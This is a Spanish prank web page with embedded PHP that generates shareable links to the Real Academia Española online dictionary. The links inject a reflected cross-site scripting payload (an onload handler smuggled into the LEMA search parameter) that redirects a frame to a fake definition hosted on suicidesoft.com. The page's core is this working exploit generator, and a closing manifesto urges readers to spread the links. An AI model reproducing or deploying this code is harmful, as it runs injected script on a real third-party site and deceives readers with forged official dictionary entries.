<html>

<head>
<title>Definidor de palabras en la RAE.</title>
<style type="text/css" media="all">
body {
background-color: #ccd ;
color: #000;
font-family: Arial, sans-serif;
align: center;
margin: 60px;
}

a:first-letter {
font-size: 1.5em;
font-weight: bold;
}

a:link {
font-weight: bold;
color: #44c;
}

a:visited {
font-weight: bold;
color: #429;
}

a:hover {
font-weight: bold;
color: #a00;
}

img { border: 0; }

p {
padding-left:0px;
}

p:first-letter {
font-size: 1.5em;
font-weight: bold;
}

h1 {
color: #a22;
}

h2 {
padding: 0 0 0 6pt;
font-family: Arial, Sans-serif;
font-size: 16pt;
color: #22a;
border-color: #a22;
letter-spacing: 3px;
border-bottom: 2px solid #A11;
border-left: 12px solid #A11;
}


#leftcol {
width:160px;
float:left;
padding:0px 0 0px 0;
}

#rightcol {
float:left;
width:600px;
margin-left: 20px;
padding: 0px 0px 0px 0px;
}

#contain{
width:670px;
background: #fff;
padding: 30px;
border: #a22 3px dashed;
}

</style>
</head>

<body>

<div id="contain">


  <h1>&iexcl;Mete tu propia palabra en el Diccionario de la Real Academia!</h1>

  &iquest;Est&aacute;s harto de los pedantes que te dicen en los foros que tus
  palabras no existen? &iquest;Quieres gastarle una broma a alguien? &iexcl;Tranquilo,
  porque la RAE est&aacute; de tu parte!


  <h2>&iexcl;Aviso para navegantes!</h2>
  Esta web es de broma :) El diccionario de la RAE no se modifica realmente. Esta web tampoco almacena tu palabra, todo el contenido est&aacute; en el enlace que se genera. La Real Academia Espa&ntilde;ola no reconoce nada de lo que pongas aqu&iacute;.

  <h2>Introduce los datos de tu palabra</h2>

  <form method="post" action="">
  <table>
    <tr><td>Palabra:</td> <td><input type="text" size="40" name="word"/></td></tr>
    <tr><td>Del lat&iacute;n:</td> <td><input type="text" size="40" name="latin"/></td></tr>
    <tr><td valign="top">Definici&oacute;n:</td> <td><textarea cols="40" rows="5" name="description"></textarea></td></tr>
    <tr><td></td><td><input type="submit" name="submit" value="Enviar"/></td></tr>
  </table>
  </form>
  
  <?php
  if (isset($_POST['submit']))
  {
  $xssurl = 'http://www.suicidesoft.com/rae/definition.php?n=' .
  base64_encode($_POST['word'])
  . '&l=' . base64_encode($_POST['latin']) . '&d=' .
  base64_encode($_POST['description']);

  $code = "r='" . $xssurl . "';d=parent.formularios;if(d.location!=r)d.location=r;";
  
  $url = 'http://buscon.rae.es/draeI/SrvltConsulta?TIPO_BUS=3&LEMA=XSS%22onload%3D%22' .
  rawurlencode($code) . '%22';
  echo '<h2>Copia este enlace</h2>';
  echo '<div style="margin-bottom:10px;"><a href="' . $url . '">' . $url . '</a></div>';
  }
  ?>


  <h2>Difunde la palabra &mdash; Minimanifiesto</h2>
  Esta web, difundidla, divulgad la palabra, &iexcl;hagamos del lenguaje un chapero maniqueo! &iexcl;Pervirtamos la sem&aacute;ntica, ahorquemos a los semi&oacute;ticos, acabemos con la comunicaci&oacute;n, reinventemos la comunicaci&oacute;n individual y personal, donde las palabras son distinto para cada cual, donde lo importante ya no es entenderse sino otra cosa que ya no podemos describir en consenso! &iexcl;Y sobre todo, muerte a P&eacute;rez-Reverte! (En un sentido figurado, obviamente).

  </div>

  </body>
  </html>
